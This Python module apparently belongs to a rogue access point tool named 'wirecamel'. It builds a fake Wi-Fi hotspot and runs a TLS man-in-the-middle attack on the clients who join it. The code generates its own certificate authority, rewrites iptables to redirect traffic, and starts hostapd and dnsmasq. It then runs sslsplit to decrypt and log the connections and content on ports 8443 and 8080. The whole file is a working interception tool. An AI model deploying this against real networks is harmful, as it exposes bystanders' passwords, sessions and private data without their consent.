# coding=utf-8
import os
import style
import subprocess
import iptables
import net

from os.path import isfile

SSL_PORT = '8443'
TCP_PORT = '8080'


# Create the sslsplit directory structure
def create_structure(config):
    if not os.path.isdir(config['main']):
        style.warning("SSLSplit structure missing, creating it...")
        os.mkdir(config['main'])
        os.mkdir(config['keys'])
        os.mkdir(config['log_dir'])


# Generate certificates for ssl split
def generate_certs(save_dir):
    # No need to generate if already exists
    if isfile("{}ca.key".format(save_dir)) and isfile("{}ca.crt".format(save_dir)):
        return

    # Private key
    style.loading("Generating private key...")
    p = subprocess.Popen(
        "openssl genrsa -out {}ca.key 4096".format(save_dir).split(" "),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    p.wait()

    # Public key
    style.loading("Generating public key...")
    p = subprocess.Popen(
        "openssl req -new -x509 -days 1826 -out {}ca.crt -key {}ca.key -subj /CN=wirecamel".format(
            save_dir,
            save_dir
        ).split(" "),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    p.wait()


# Start SSL Split
def start(tmp_dir_iptables, iptables_conf, interface, hostapd_conf, connections_log, log_dir, keys_dir):
    # Checking processes with airmon-ng
    res = net.kill_unwanted()
    style.print_call_info(res, "airmon-ng", "Killed unwanted processes.")

    # Unblocking wifi if needed
    res = net.check_rfkill()
    style.print_call_info(res, "rfkill", "Unblocked Wifi (Soft and Hardware mode)")

    # Saving actual iptables rules to restore it after stopping the ap
    iptables.save_rules()
    style.checked('Saved actual iptables rules')

    # Flushing iptables
    res = iptables.flush_nat()
    style.print_call_info(res, 'iptables', 'Flushed iptables rules')

    # Starting dnsmasq service
    res = subprocess.call("service dnsmasq start".split(" "), stdout=subprocess.PIPE)
    style.checked('Started dnsmasq service')

    # Loading iptables rules for SSLSplit and hostapd
    res = iptables.restore(iptables.SSLSPLIT_CONF)
    style.print_call_info(res, 'iptables', 'Updated iptables rules for SSL Split')

    # Confiuguring interface
    res = subprocess.call(
        "ifconfig {} 10.0.0.1/24 up".format(interface).split(" "),
        stdout=subprocess.PIPE
    )
    style.print_call_info(res, "ifconfig", "Configured interface")

    # Enabling IP forward
    res = net.ipforward(enable=True)
    style.print_call_info(res, "ip_forward", "Enabled IP forwarding")

    # Starting hostapd
    subhostapd = subprocess.Popen(
        [
            'xterm', '-T', 'Hostapd console',
            '-hold', '-e',

            'hostapd', '-d', hostapd_conf
        ]
    )
    style.print_call_info(0, "hostapd", "Started hostapd")

    # Starting SSL Split
    subssl = subprocess.Popen(
        [
            'xterm', '-T', 'SSL Split console', '-e',

            'sslsplit', '-D',
            '-l', connections_log,
            '-S', log_dir,
            '-k', "{}/ca.key".format(keys_dir),
            '-c', "{}/ca.crt".format(keys_dir),
            'ssl', '0.0.0.0', SSL_PORT,
            'tcp', '0.0.0.0', TCP_PORT
        ]
    )
    style.print_call_info(0, "sslsplit", "Started SSLSplit")

    return subhostapd, subssl
